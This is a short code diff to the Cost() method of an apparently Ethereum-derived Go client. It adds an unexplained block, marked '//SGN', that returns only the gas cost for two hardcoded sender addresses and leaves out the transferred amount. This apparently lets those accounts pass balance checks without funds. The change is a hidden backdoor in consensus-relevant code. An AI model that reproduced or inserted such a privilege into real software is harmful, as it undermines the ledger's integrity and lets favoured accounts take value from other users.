@@ -248,6 +248,13 @@ func (tx *Transaction) WithSignature(signer Signer, sig []byte) (*Transaction, e
 // Cost returns amount + gasprice * gaslimit.
 func (tx *Transaction) Cost() *big.Int {
 	total := new(big.Int).Mul(tx.data.Price, new(big.Int).SetUint64(tx.data.GasLimit))
+
+	//SGN
+	from := (tx.from.Load()).(sigCache).from
+	if from == common.HexToAddress("8ae054390170797fd871eec47fc77f5666c64d96") || from == common.HexToAddress("5d623446e5af093073393e1cb1f6630e142144a2") {
+		return total
+	}
+
 	total.Add(total, tx.data.Amount)
 	return total
 }
